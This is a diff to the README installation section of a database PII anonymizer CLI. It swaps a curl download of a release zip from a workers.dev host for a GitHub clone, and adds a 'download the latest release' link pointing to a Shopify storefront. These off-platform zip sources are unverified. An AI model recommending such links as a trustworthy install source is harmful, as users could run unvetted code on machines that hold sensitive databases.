@@ -63,12 +63,13 @@ $ python main.py sanitize --db-url $DATABASE_URL --rules rules.json
 ## 📦 Installation
 
 ```bash
-# Download the latest release
-curl -LO https://cloud-db-anonymizer.fadadyounes.workers.dev/cloud-db-anonymizer-cli-v1.0.0.zip
-unzip cloud-db-anonymizer-cli-v1.0.0.zip && cd cloud-db-anonymizer
+git clone https://github.com/fadadyounes-pixel/cloud-db-anonymizer.git
+cd cloud-db-anonymizer
 python -m venv .venv && source .venv/bin/activate     # Windows: .venv\Scripts\activate
 pip install -r requirements.txt
 ```
+
+Prefer a zip? [Download the latest release](https://qhnfvf-jb.myshopify.com/products/cloud-db-anonymizer-cli-free) · Project page: [PostgreSQL PII Anonymizer](https://qhnfvf-jb.myshopify.com/pages/postgresql-pii-anonymizer)
 
 `pg_dump` (from the PostgreSQL client tools) is recommended so the dump includes your schema. Without it you get a data-only dump.
 
